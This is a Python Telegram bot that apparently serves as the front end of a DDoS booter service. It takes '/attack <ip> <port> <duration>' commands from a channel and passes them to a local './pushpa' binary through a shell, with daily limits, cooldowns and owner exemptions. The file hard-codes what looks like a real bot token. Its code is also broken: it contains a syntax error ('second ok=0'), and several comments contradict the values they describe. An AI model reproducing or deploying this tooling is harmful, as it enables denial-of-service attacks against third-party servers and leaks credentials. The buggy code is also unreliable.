import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '7709792223:AAEy3BwIheJ2ikrhrAsHKlHlTnKUQmZl7hs'  # Replace with your actual bot token
CHANNEL_ID = '-1002421000156'  # Replace with your specific channel or group ID
# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 60  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 5  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [1549748318, 6654576379]

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second ok=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# Handler for photos sent by users
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_photos[user_id] = True  # Mark that the user has sent a photo as feedback

@bot.message_handler(commands=['attack'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @RAJOWNER90 ( TUMHARE_PAPA ) | 𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚 ]")
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 1} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 5} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 2 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /attack  <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")

        target_ip, target_port, user_duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("Invalid duration. Must be a positive integer.")

        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 240 seconds, but display the input duration
        default_duration = 240
        bot.send_message(
            message.chat.id,
            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
        )

        # Log the attack started message
        logging.info(f"Attack started by {user_name}: ./pushpa {target_ip} {target_port} {default_duration} 677")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./pushpa {target_ip} {target_port} {duration} 677"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺™")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"{e}")
